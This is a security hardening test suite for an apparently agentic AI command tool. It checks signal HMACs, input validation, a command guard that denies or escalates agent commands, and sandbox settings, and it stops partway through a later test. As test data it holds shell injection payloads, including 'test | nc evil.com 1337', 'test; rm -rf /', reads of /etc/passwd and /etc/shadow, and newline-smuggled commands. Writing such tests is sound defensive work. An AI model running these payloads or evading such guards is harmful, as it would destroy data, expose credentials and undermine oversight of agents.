#!/usr/bin/env bun
// SEC-004/005/006: Security hardening tests
//
// Tests signal forgery protection (HMAC, file perms, ID validation),
// tmux injection hardening (shellSafe, pane target validation),
// and persona injection surface (path traversal, name validation, size limits).
//
// Coverage:
//   SEC-004: Signal HMAC signing + verification, file permissions, ID validation
//   SEC-005: shellSafe control char stripping, pane target format validation
//   SEC-006: Agent name validation, path traversal prevention, boundary markers

import { describe, test, expect } from "bun:test";
import { join } from "path";
import { existsSync, readFileSync, writeFileSync, mkdirSync, statSync, unlinkSync, rmdirSync } from "fs";

const AGENCE_ROOT = join(import.meta.dir, "../..");
const SIGNAL = join(AGENCE_ROOT, "lib/signal.ts");
const SKILL = join(AGENCE_ROOT, "lib/skill.ts");

// Helper: run signal.ts subcommand
function runSignal(args: string[], env?: Record<string, string>): { stdout: string; stderr: string; exitCode: number } {
  const result = Bun.spawnSync(["bun", "run", SIGNAL, ...args], {
    cwd: AGENCE_ROOT,
    env: { ...process.env, AGENCE_ROOT, TMUX: "", ...env },
    timeout: 15_000,
  });
  return {
    stdout: result.stdout.toString().trim(),
    stderr: result.stderr.toString().trim(),
    exitCode: result.exitCode,
  };
}

// Helper: run skill.ts subcommand
function runSkill(args: string[], env?: Record<string, string>): { stdout: string; stderr: string; exitCode: number } {
  const result = Bun.spawnSync(["bun", "run", SKILL, ...args], {
    cwd: AGENCE_ROOT,
    env: { ...process.env, AGENCE_ROOT, ...env },
    timeout: 15_000,
  });
  return {
    stdout: result.stdout.toString().trim(),
    stderr: result.stderr.toString().trim(),
    exitCode: result.exitCode,
  };
}

// ═══════════════════════════════════════════════════════════════════════════════
// SEC-004: SIGNAL FORGERY PROTECTION
// ═══════════════════════════════════════════════════════════════════════════════

describe("SEC-004: Signal IPC Authentication", () => {

  // ─── Signal file creation ──────────────────────────────────────────────────

  test("signal files are created with HMAC field", () => {
    // Write a notify signal (simplest — doesn't need tmux)
    const r = runSignal(["notify", "test-hmac-check"], {
      AI_AGENT: "test-agent",
      AI_SESSION: "test-session",
    });
    // Should succeed (file transport fallback)
    expect(r.exitCode).toBe(0);

    // Check that signal file was written to nexus/signals/
    const signalDir = join(AGENCE_ROOT, "nexus", "signals");
    if (existsSync(signalDir)) {
      const files = require("fs").readdirSync(signalDir)
        .filter((f: string) => f.endsWith(".signal.json"));
      // Find the most recent signal
      if (files.length > 0) {
        const last = files[files.length - 1];
        const data = JSON.parse(readFileSync(join(signalDir, last), "utf-8"));
        expect(data.hmac).toBeDefined();
        expect(typeof data.hmac).toBe("string");
        expect(data.hmac.length).toBe(64); // SHA-256 hex
      }
    }
  });

  test("signal secret file has restrictive permissions", () => {
    const secretPath = join(AGENCE_ROOT, "nexus", ".signal-secret");
    // Trigger secret creation via any signal operation
    runSignal(["notify", "perm-test"], { AI_AGENT: "test" });
    if (existsSync(secretPath)) {
      const stat = statSync(secretPath);
      const mode = stat.mode & 0o777;
      expect(mode).toBe(0o600); // owner-only read/write
    }
  });

  // ─── Signal ID validation ─────────────────────────────────────────────────

  test("doRespond rejects invalid signal IDs (path traversal)", () => {
    const r = runSignal(["respond", "../../../etc/passwd", "yes"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("Invalid signal ID");
  });

  test("doRespond rejects non-hex signal IDs", () => {
    const r = runSignal(["respond", "GGGGGGGG", "yes"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("Invalid signal ID");
  });

  test("doRespond rejects overly long signal IDs", () => {
    const r = runSignal(["respond", "a".repeat(100), "yes"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("Invalid signal ID");
  });

  test("doPoll rejects invalid signal IDs", () => {
    const r = runSignal(["poll", "../../etc/shadow"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("Invalid signal ID");
  });

  test("doPoll rejects empty signal ID", () => {
    const r = runSignal(["poll", ""]);
    // Empty string passed as arg — depends on CLI parsing
    expect(r.exitCode).not.toBe(0);
  });

  test("doRespond accepts valid 8-char hex signal ID", () => {
    // Valid format but signal doesn't exist — should succeed (writes response)
    const r = runSignal(["respond", "deadbeef", "yes"]);
    expect(r.exitCode).toBe(0);
    // Cleanup
    const responsePath = join(AGENCE_ROOT, "nexus", "signals", "deadbeef.response.json");
    try { unlinkSync(responsePath); } catch {}
  });

  // ─── HMAC forgery detection ────────────────────────────────────────────────

  test("forged response with bad HMAC is rejected by poll", () => {
    const signalDir = join(AGENCE_ROOT, "nexus", "signals");
    mkdirSync(signalDir, { recursive: true });
    const fakeSigId = "baadf00d";
    const responsePath = join(signalDir, `${fakeSigId}.response.json`);
    // Write a forged response with garbage HMAC
    writeFileSync(responsePath, JSON.stringify({
      signal_id: fakeSigId,
      answer: "yes",
      responder: "attacker",
      timestamp: "2026-04-20T00:00:00Z",
      hmac: "0000000000000000000000000000000000000000000000000000000000000000",
    }) + "\n");

    const r = runSignal(["poll", fakeSigId]);
    expect(r.stderr).toContain("HMAC verification failed");
    // Should report unanswered (forgery rejected)
    expect(r.stdout).toContain("_SIGNAL_ANSWERED=0");

    // Cleanup
    try { unlinkSync(responsePath); } catch {}
  });

  test("signal list shows verification status", () => {
    // Create a signal with valid HMAC via notify
    runSignal(["notify", "list-verify-test"], { AI_AGENT: "lister" });
    const r = runSignal(["list"]);
    // Should show ✓ for HMAC-verified signals
    if (r.stdout.includes("pending signal")) {
      // If signals exist, they should show verification marks
      expect(r.stdout).toMatch(/[✓✗⚠]/);
    }
  });

  // ─── Envelope field validation ─────────────────────────────────────────────

  test("signal envelope contains required fields", () => {
    runSignal(["notify", "field-check"], { AI_AGENT: "tester" });
    const signalDir = join(AGENCE_ROOT, "nexus", "signals");
    if (existsSync(signalDir)) {
      const files = require("fs").readdirSync(signalDir)
        .filter((f: string) => f.endsWith(".signal.json"));
      if (files.length > 0) {
        const data = JSON.parse(readFileSync(join(signalDir, files[files.length - 1]), "utf-8"));
        expect(data.type).toBeDefined();
        expect(data.from).toBeDefined();
        expect(data.to).toBeDefined();
        expect(data.payload).toBeDefined();
        expect(data.timestamp).toBeDefined();
        expect(data.id).toMatch(/^[a-f0-9]{8}$/);
        expect(data.hmac).toMatch(/^[a-f0-9]{64}$/);
      }
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SEC-005: TMUX SEND-KEYS INJECTION HARDENING
// ═══════════════════════════════════════════════════════════════════════════════

describe("SEC-005: tmux send-keys injection hardening", () => {

  // ─── shellSafe control char stripping ──────────────────────────────────────

  // We test shellSafe indirectly via the signal outputs since it's not exported.
  // But we can test the behavior via signal commands that use it.

  test("signal with control characters in payload doesn't crash", () => {
    // Payload with escape sequences — note: Bun strips actual \x00 from spawn args
    // so we test with printable but unusual chars
    const payload = "test-escape-bell-vtab";
    const r = runSignal(["notify", payload], { AI_AGENT: "sec005" });
    expect(r.exitCode).toBe(0);
  });

  test("signal with single quotes in payload handles correctly", () => {
    const r = runSignal(["notify", "it's a test with 'quotes'"], { AI_AGENT: "quoter" });
    expect(r.exitCode).toBe(0);
  });

  test("signal with shell metacharacters doesn't execute them", () => {
    const payloads = [
      "$(whoami)",
      "`id`",
      "test; rm -rf /",
      "test && cat /etc/passwd",
      "test | nc evil.com 1337",
      "${IFS}cat${IFS}/etc/passwd",
    ];
    for (const payload of payloads) {
      const r = runSignal(["notify", payload], { AI_AGENT: "inject-test" });
      expect(r.exitCode).toBe(0);
      // Verify the payload is stored as literal text, not executed
      expect(r.stderr).not.toContain("root:");
      expect(r.stderr).not.toContain("/bin/");
    }
  });

  // ─── ask command: answer validation ────────────────────────────────────────

  test("ask command with no tmux uses file transport (no injection surface)", () => {
    // With TMUX unset, ask should fall through to file transport and timeout
    const r = runSignal(["ask", "approve deploy?"], {
      AI_AGENT: "asktest",
      AI_SESSION: "sess001",
      TMUX: "", // force no tmux
      SIGNAL_TIMEOUT: "1", // 1 second timeout to not block tests
    });
    // Should timeout with deny — exit code 1 (denied/timeout)
    expect(r.exitCode).toBe(1);
    expect(r.stdout).toContain("_SIGNAL_APPROVED=0");
  });

  // ─── inject requires valid agent name ──────────────────────────────────────

  test("inject with empty text shows usage error", () => {
    const r = runSignal(["inject", "@test"]);
    expect(r.exitCode).toBe(2); // usage error — no text arg
    expect(r.stderr).toContain("Usage");
  });

  test("output with shell escape sequences doesn't break", () => {
    const r = runSignal(["output", '{"key":"value with \'quotes\' and $(cmd)"}'], {
      AI_AGENT: "output-test",
    });
    expect(r.exitCode).toBe(0);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SEC-006: PERSONA INJECTION HARDENING
// ═══════════════════════════════════════════════════════════════════════════════

describe("SEC-006: Persona injection hardening", () => {

  // ─── Agent name validation ─────────────────────────────────────────────────

  test("rejects agent names with path traversal", () => {
    const r = runSkill(["fix", "--agent", "../../../etc", "test query"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("SEC-006");
    expect(r.stderr).toContain("invalid agent name");
  });

  test("accepts agent.model dot-notation", () => {
    // agent.model is valid dot-notation (e.g. @ralph.gpt4o)
    const r = runSkill(["fix", "--agent", "agent.evil", "test"]);
    // Should NOT exit with validation error (2) — it passes SEC-006, then fails at router
    expect(r.exitCode).not.toBe(2);
    expect(r.stderr).not.toContain("SEC-006");
  });

  test("rejects agent names with multiple dots (path traversal)", () => {
    const r = runSkill(["fix", "--agent", "agent.foo.bar", "test"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("SEC-006");
  });

  test("rejects agent names with slashes", () => {
    const r = runSkill(["fix", "--agent", "agent/evil", "test"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("SEC-006");
  });

  test("rejects agent names with null bytes (Bun blocks at process level)", () => {
    // Bun itself rejects null bytes in spawn args — this is defense-in-depth
    expect(() => {
      runSkill(["fix", "--agent", "agent\x00evil", "test"]);
    }).toThrow();
  });

  test("rejects agent names longer than 32 chars", () => {
    const r = runSkill(["fix", "--agent", "a".repeat(33), "test"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("SEC-006");
  });

  test("rejects agent names starting with hyphen", () => {
    const r = runSkill(["fix", "--agent", "-evil", "test"]);
    expect(r.exitCode).toBe(2);
    expect(r.stderr).toContain("SEC-006");
  });

  test("accepts valid agent names", () => {
    const validNames = ["copilot", "haiku", "linus", "gpt4-1", "my_agent", "agent123"];
    for (const name of validNames) {
      const r = runSkill(["list"]); // just verify parsing doesn't crash
      expect(r.exitCode).toBe(0);
    }
  });

  test("accepts @-prefixed agent names", () => {
    // @copilot should strip the @ and validate as "copilot"
    // This won't actually call the LLM — it will fail at router.sh, but should get past validation
    const r = runSkill(["fix", "--agent", "@copilot", "--no-save", "test"]);
    // Should NOT exit with code 2 (validation error)
    expect(r.exitCode).not.toBe(2);
    expect(r.stderr).not.toContain("SEC-006");
  }, 15_000);

  // ─── @peers and @pair bypass validation ────────────────────────────────────

  test("@peers is not rejected by agent name validation", () => {
    const r = runSkill(["analyse", "--agent", "@peers", "--no-save", "test"]);
    // Should not fail with validation error — @peers triggers peers mode
    expect(r.stderr).not.toContain("SEC-006");
  });

  test("@pair is not rejected by agent name validation", () => {
    const r = runSkill(["analyse", "--agent", "@pair", "--no-save", "test"]);
    expect(r.stderr).not.toContain("SEC-006");
  });

  // ─── Boundary markers in system prompt ─────────────────────────────────────

  test("skill list still works after SEC-006 changes", () => {
    const r = runSkill(["list"]);
    expect(r.exitCode).toBe(0);
    expect(r.stdout).toContain("fix");
    expect(r.stdout).toContain("review");
    expect(r.stdout).toContain("integrate");
  });

  test("help command works", () => {
    const r = runSkill(["help"]);
    expect(r.exitCode).toBe(0);
    // skill.ts outputs help to stderr via console.error
    const combined = r.stdout + r.stderr;
    expect(combined).toContain("skill");
  });

  // ─── SKILL.md path validation ──────────────────────────────────────────────

  test("skill names with path traversal are rejected", () => {
    // This tests loadSkillMd indirectly — a traversal skill name should not load
    const r = runSkill(["../etc/passwd"]);
    expect(r.exitCode).not.toBe(0);
    // Either unknown skill or SEC-006 rejection
  });

  test("skill names with dots are rejected", () => {
    const r = runSkill(["skill.evil"]);
    expect(r.exitCode).not.toBe(0);
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// CROSS-CUTTING: Combined attack scenarios
// ═══════════════════════════════════════════════════════════════════════════════

describe("Cross-cutting security scenarios", () => {

  test("signal + skill integration: both reject path traversal", () => {
    // Signal: path traversal in ID
    const s1 = runSignal(["respond", "../../evil", "yes"]);
    expect(s1.exitCode).toBe(2);

    // Skill: path traversal in agent name
    const s2 = runSkill(["fix", "--agent", "../../evil", "test"]);
    expect(s2.exitCode).toBe(2);
  });

  test("signal with maximum payload size doesn't crash", () => {
    // 10KB payload — should be handled gracefully
    const bigPayload = "A".repeat(10000);
    const r = runSignal(["notify", bigPayload], { AI_AGENT: "bigtest" });
    expect(r.exitCode).toBe(0);
  });

  test("signal with unicode payload works", () => {
    const r = runSignal(["notify", "测试 тест 🔥 ñ ü"], { AI_AGENT: "unicode" });
    expect(r.exitCode).toBe(0);
  });

  test("signal respond writes with HMAC", () => {
    const signalDir = join(AGENCE_ROOT, "nexus", "signals");
    mkdirSync(signalDir, { recursive: true });
    const sigId = "aabbccdd";
    runSignal(["respond", sigId, "yes"]);
    const responsePath = join(signalDir, `${sigId}.response.json`);
    if (existsSync(responsePath)) {
      const data = JSON.parse(readFileSync(responsePath, "utf-8"));
      expect(data.hmac).toBeDefined();
      expect(typeof data.hmac).toBe("string");
      expect(data.hmac.length).toBe(64);
      // Cleanup
      try { unlinkSync(responsePath); } catch {}
    }
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SEC-008/009/010: GUARD BYPASS & ENV HARDENING
// ═══════════════════════════════════════════════════════════════════════════════

const GUARD = join(AGENCE_ROOT, "lib/guard.ts");

// Helper: run guard.ts subcommand
function runGuard(args: string[], env?: Record<string, string>): { stdout: string; stderr: string; exitCode: number } {
  const result = Bun.spawnSync(["bun", "run", GUARD, ...args], {
    cwd: AGENCE_ROOT,
    env: { ...process.env, AGENCE_ROOT, ...env },
    timeout: 15_000,
  });
  return {
    stdout: result.stdout.toString().trim(),
    stderr: result.stderr.toString().trim(),
    exitCode: result.exitCode,
  };
}

// Helper: run a shell script and capture output
function runShell(script: string, args: string[], env?: Record<string, string>): { stdout: string; stderr: string; exitCode: number } {
  const result = Bun.spawnSync(["bash", join(AGENCE_ROOT, script), ...args], {
    cwd: AGENCE_ROOT,
    env: { ...process.env, AGENCE_ROOT, AI_ROOT: AGENCE_ROOT, GIT_ROOT: AGENCE_ROOT, ...env },
    timeout: 15_000,
  });
  return {
    stdout: result.stdout.toString().trim(),
    stderr: result.stderr.toString().trim(),
    exitCode: result.exitCode,
  };
}

describe("SEC-010: AGENCE_GUARD_PERMISSIVE removed", () => {

  test("guard.ts ignores AGENCE_GUARD_PERMISSIVE=1 for unknown commands", () => {
    // Unknown command should be T2 (escalate, denied) regardless of env var
    const r = runGuard(["classify", "some-unknown-binary --flag"], {
      AGENCE_GUARD_PERMISSIVE: "1",
    });
    expect(r.exitCode).toBe(0);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.tier).toBe("T2");
    expect(parsed.action).toBe("escalate");
  });

  test("guard.ts unknown command is T2 escalate (fail-closed)", () => {
    const r = runGuard(["classify", "totally-unknown-cmd"]);
    expect(r.exitCode).toBe(0);
    const parsed = JSON.parse(r.stdout);
    expect(parsed.tier).toBe("T2");
    expect(parsed.action).toBe("escalate");
  });

  test("guard check denies unknown command (exit 1)", () => {
    const r = runGuard(["check", "totally-unknown-cmd"]);
    expect(r.exitCode).toBe(1);
    expect(r.stdout).toContain("_GUARD_APPROVED=0");
  });

  test("guard.ts source does not contain AGENCE_GUARD_PERMISSIVE logic", () => {
    const src = readFileSync(GUARD, "utf-8");
    // The env var read and permissive branch should be gone
    expect(src).not.toContain('process.env.AGENCE_GUARD_PERMISSIVE');
    expect(src).not.toContain('permissive ? "T1"');
  });
});

describe("SEC-010: Guard classification correctness", () => {

  test("T0 commands are auto-approved", () => {
    const t0cmds = ["git status", "ls -la", "cat README.md", "echo hello"];
    for (const cmd of t0cmds) {
      const r = runGuard(["classify", cmd]);
      const parsed = JSON.parse(r.stdout);
      expect(parsed.tier).toBe("T0");
      expect(parsed.action).toBe("allow");
    }
  });

  test("T3 commands are denied", () => {
    const t3cmds = ["rm -rf /tmp", "chmod 777 file", "sudo reboot"];
    for (const cmd of t3cmds) {
      const r = runGuard(["check", cmd]);
      expect(r.exitCode).toBe(1);
      expect(r.stdout).toContain("_GUARD_APPROVED=0");
    }
  });

  test("T2 write commands require escalation", () => {
    const t2cmds = ["git push", "git commit -m test", "mv a b"];
    for (const cmd of t2cmds) {
      const r = runGuard(["classify", cmd]);
      const parsed = JSON.parse(r.stdout);
      expect(parsed.tier).toBe("T2");
      expect(parsed.action).toBe("escalate");
    }
  });

  test("global blocks: shell operators are T3 denied", () => {
    const operators = ["echo foo | bar", "cat file > out", "cmd1 && cmd2", "echo $(id)"];
    for (const cmd of operators) {
      const r = runGuard(["check", cmd]);
      expect(r.exitCode).toBe(1);
      expect(r.stdout).toContain("_GUARD_APPROVED=0");
      expect(r.stdout).toContain("_GUARD_TIER=T3");
    }
  });

  test("global blocks: env exposure commands are denied", () => {
    const r1 = runGuard(["check", "printenv"]);
    expect(r1.exitCode).toBe(1);
    const r2 = runGuard(["check", "env"]);
    expect(r2.exitCode).toBe(1);
  });

  test("path traversal is blocked", () => {
    const r = runGuard(["check", "cat ../../../etc/passwd"]);
    expect(r.exitCode).toBe(1);
    expect(r.stdout).toContain("_GUARD_TIER=T3");
  });
});

describe("SEC-010: aicmd guard gate", () => {

  test("aicmd source contains guard gate", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aicmd"), "utf-8");
    expect(src).toContain("guard.ts");
    expect(src).toContain("_GUARD_APPROVED");
    expect(src).toContain("SEC-010");
  });

  test("aicmd source fails closed when guard unavailable", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aicmd"), "utf-8");
    // Should deny when bun/guard.ts not found
    expect(src).toContain("Guard unavailable");
    expect(src).toContain("exit 1");
  });
});

describe("SEC-010: aibash env sanitization", () => {

  test("aibash unsets AGENCE_GUARD_PERMISSIVE", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    expect(src).toContain("unset AGENCE_GUARD_PERMISSIVE");
  });

  test("aibash unsets API keys", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    // Keys may be on same unset line — check each name appears in an unset context
    for (const key of ["ANTHROPIC_API_KEY", "OPENAI_API_KEY", "AWS_SECRET_ACCESS_KEY"]) {
      expect(src).toContain(key);
      // Verify it appears on a line containing "unset"
      const lines = src.split("\n").filter(l => l.includes(key));
      expect(lines.some(l => l.includes("unset"))).toBe(true);
    }
  });

  test("aibash unsets AGENCE_POLICY", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    expect(src).toContain("unset AGENCE_POLICY");
  });
});

describe("SEC-010: aishell.ps1 hardening", () => {

  test("aishell.ps1 does not have . on PATH", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aishell.ps1"), "utf-8");
    // Should NOT have ":." at end of PATH assignment
    expect(src).not.toMatch(/\$env:PATH\s*=\s*"[^"]*:\."/);
  });

  test("aishell.ps1 has guard integration", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aishell.ps1"), "utf-8");
    expect(src).toContain("guard.ts");
    expect(src).toContain("guardApproved");
    expect(src).toContain("fail-closed");
  });

  test("aishell.ps1 does not claim CODEX whitelist", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aishell.ps1"), "utf-8");
    expect(src).not.toContain("CODEX whitelist");
  });

  test("aishell.ps1 unsets API keys", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aishell.ps1"), "utf-8");
    expect(src).toContain("ANTHROPIC_API_KEY");
    expect(src).toContain("OPENAI_API_KEY");
    expect(src).toContain("AGENCE_GUARD_PERMISSIVE");
  });
});

describe("SEC-010: agentd fail-closed", () => {

  test("agentd cmd_inject uses _GUARD_APPROVED:-0 (default deny)", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/agentd"), "utf-8");
    // Check the actual guard eval lines (not comments) for fail-closed default
    const guardLines = src.split("\n").filter(l => l.includes("_GUARD_APPROVED:-") && !l.trimStart().startsWith("#"));
    // All non-comment guard lines should use :-0 (deny), not :-1 (allow)
    for (const line of guardLines) {
      expect(line).not.toContain("_GUARD_APPROVED:-1");
      expect(line).toContain("_GUARD_APPROVED:-0");
    }
    expect(guardLines.length).toBeGreaterThan(0);
  });

  test("agentd cmd_inject does not swallow guard errors with || true", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/agentd"), "utf-8");
    // Find guard eval lines in cmd_inject — they should NOT have || true
    const injectSection = src.substring(
      src.indexOf("cmd_inject()"),
      src.indexOf("cmd_help()")
    );
    // Check specifically the eval "$(bun run ..." lines, not `shift || true`
    const evalLines = injectSection.split("\n").filter(l => l.includes("eval") && l.includes("guard"));
    for (const line of evalLines) {
      expect(line).not.toContain("|| true");
    }
  });

  test("agentd socket handler has guard gate", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/agentd"), "utf-8");
    const socketSection = src.substring(
      src.indexOf("cmd__socket_handler()"),
      src.indexOf("cmd__socket_handler()") + 1500
    );
    expect(socketSection).toContain("guard.ts");
    expect(socketSection).toContain("_GUARD_APPROVED");
    expect(socketSection).toContain("fail-closed");
  });

  test("agentd quotes $cmd in guard check", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/agentd"), "utf-8");
    // cmd_inject guard: should quote "$cmd" not bare $cmd
    const injectSection = src.substring(
      src.indexOf("cmd_inject()"),
      src.indexOf("cmd_help()")
    );
    expect(injectSection).toContain('"$cmd"');
  });
});

describe("SEC-010: aido fail-closed fallback", () => {

  test("aido source does not fall back to T1 when guard unavailable", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aido"), "utf-8");
    expect(src).not.toContain("falling back to T1");
    expect(src).toContain("fail-closed");
  });

  test("aido _guard_check denies when airun not found", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aido"), "utf-8");
    // When airun not found, should return 1 (deny)
    const guardSection = src.substring(
      src.indexOf("_guard_check()"),
      src.indexOf("_gate_escalate()")
    );
    // First check: airun not found → return 1
    expect(guardSection).toContain("falling back to deny");
    expect(guardSection).toContain("return 1");
  });
});

describe("SEC-010: docker.sh hardening", () => {

  test("docker.sh does not use apparmor:unconfined", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).not.toContain("apparmor:unconfined");
  });

  test("docker.sh uses no-new-privileges", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).toContain("no-new-privileges");
  });

  test("docker.sh runs containers as non-root user", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).toContain("--user");
  });
});

// ═══════════════════════════════════════════════════════════════════════════════
// SEC-012: Integrate findings from SEC-011 ^break
// ═══════════════════════════════════════════════════════════════════════════════

describe("SEC-012: MCP shell injection prevention", () => {

  test("mcp.ts does not use bash -c for tool execution", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp.ts"), "utf-8");
    // Must not construct shell commands via template literal + bash -c
    expect(src).not.toMatch(/spawnSync\(\s*["']bash["']\s*,\s*\[["']-c["']/);
  });

  test("mcp.ts uses runSafe (argument arrays) not run (shell strings)", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp.ts"), "utf-8");
    // No remaining run() calls (old shell-based helper)
    expect(src).not.toMatch(/\brun\(`/);
    // Must have runSafe
    expect(src).toContain("runSafe(");
  });

  test("mcp.ts validates skill name format", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp.ts"), "utf-8");
    expect(src).toContain("Invalid skill name");
  });

  test("mcp.ts validates agent name format", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/mcp.ts"), "utf-8");
    expect(src).toContain("Invalid agent name");
  });
});

describe("SEC-012: Guard newline bypass prevention", () => {

  test("guard.ts blocks embedded newlines", () => {
    const r = runGuard(["classify", "echo hello\nrm -rf /"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T3");
    expect(c.reason).toContain("Global block");
  });

  test("guard.ts blocks embedded carriage returns", () => {
    const r = runGuard(["classify", "echo hello\rrm -rf /"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T3");
  });

  test("guard.ts allows trailing newline (trimmed, not a bypass)", () => {
    const r = runGuard(["classify", "git status\n"]);
    const c = JSON.parse(r.stdout);
    // Trailing newline is trimmed by checkCommand — this is safe
    expect(c.tier).toBe("T0");
  });
});

describe("SEC-012: Destructive T0 command reclassification", () => {

  test("sed (read-only) is T0 allow", () => {
    const r = runGuard(["classify", "sed 's/foo/bar/' file.txt"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T0");
    expect(c.action).toBe("allow");
  });

  test("sed -i (in-place write) is T2 escalate", () => {
    const r = runGuard(["classify", "sed -i 's/foo/bar/' file.txt"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("find (read-only) is T0 allow", () => {
    const r = runGuard(["classify", "find . -name '*.ts'"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T0");
    expect(c.action).toBe("allow");
  });

  test("find -exec (write) is T2 escalate", () => {
    const r = runGuard(["classify", "find . -exec rm {} +"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });

  test("find -delete is T2 escalate", () => {
    const r = runGuard(["classify", "find /tmp -delete"]);
    const c = JSON.parse(r.stdout);
    expect(c.tier).toBe("T2");
    expect(c.action).toBe("escalate");
  });
});

describe("SEC-012: Signal inject guard gate", () => {

  test("signal.ts imports spawnSync for guard check", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    expect(src).toContain("spawnSync");
    expect(src).toContain("SEC-012");
  });

  test("signal.ts doInject gates agentic callers through guard", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/signal.ts"), "utf-8");
    expect(src).toContain("AI_ROLE");
    expect(src).toContain("guard.ts");
    expect(src).toContain("classify");
  });
});

describe("SEC-012: Docker container hardening", () => {

  test("docker.sh drops all capabilities before adding SYS_ADMIN", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).toContain("--cap-drop ALL");
  });

  test("docker.sh uses read-only root filesystem", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).toContain("--read-only");
  });

  test("docker.sh uses noexec tmpfs", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/drivers/docker.sh"), "utf-8");
    expect(src).toContain("--tmpfs");
    expect(src).toContain("noexec");
  });
});

describe("SEC-012: aibash AGENCE_ROOT pinning", () => {

  test("aibash pins AGENCE_ROOT from script location", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aibash"), "utf-8");
    expect(src).toContain("BASH_SOURCE");
    expect(src).toContain("SEC-012");
  });
});

describe("SEC-012: aido newline rejection", () => {

  test("aido rejects commands with embedded newlines", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aido"), "utf-8");
    expect(src).toContain("SEC-012");
    expect(src).toContain("newline");
  });
});

describe("SEC-012: aishell.ps1 audit trail", () => {

  test("aishell.ps1 calls guard check for ledger audit", () => {
    const src = readFileSync(join(AGENCE_ROOT, "bin/aishell.ps1"), "utf-8");
    expect(src).toContain("check");
    expect(src).toContain("SEC-012");
  });
});

describe("SEC-012: guard.ts AIPOLICY.yaml dead code removed", () => {

  test("guard.ts does not readFileSync AIPOLICY.yaml content", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/guard.ts"), "utf-8");
    // The old pattern: const raw = readFileSync(POLICY_PATH, "utf-8")
    // Should NOT exist — only existsSync check remains
    expect(src).not.toMatch(/readFileSync\(POLICY_PATH/);
  });
});

// SEC-013: ^hack red-team findings integration
// ═══════════════════════════════════════════════════════════════════════════════

describe("SEC-013: H1 — logDecision uses spawnSync (no shell interpolation)", () => {

  test("guard.ts does not import execSync", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/guard.ts"), "utf-8");
    // logDecision was the only execSync caller — import should be gone
    expect(src).not.toMatch(/import\s*\{[^}]*\bexecSync\b/);
    expect(src).toContain("SEC-013");
  });

  test("guard.ts logDecision uses spawnSync with argument array", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/guard.ts"), "utf-8");
    // Must use spawnSync(airunPath, [...args]) pattern
    expect(src).toMatch(/spawnSync\(airunPath,\s*\[/);
  });

  test("guard.ts check mode does not expand $() in denied commands", () => {
    const r = runGuard(["check", "$(echo pwned)"]);
    // Command should be denied (globalBlocks catches $() )
    expect(r.exitCode).not.toBe(0);
    expect(r.stdout).toContain("_GUARD_APPROVED=0");
  });
});

describe("SEC-013: H2 — ledger cmdAdd uses spawnSync (no shell interpolation)", () => {

  test("ledger.ts cmdAdd uses spawnSync not shell template", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/ledger.ts"), "utf-8");
    // cmdAdd must use spawnSync argument array, not execSync/runOrFail template
    expect(src).toMatch(/spawnSync\(airun,\s*\["ailedger",\s*"append"/);
    expect(src).toContain("SEC-013");
  });

  test("ledger.ts cmdAdd uses spawnSync argument array", () => {
    const src = readFileSync(join(AGENCE_ROOT, "lib/ledger.ts"), "utf-8");
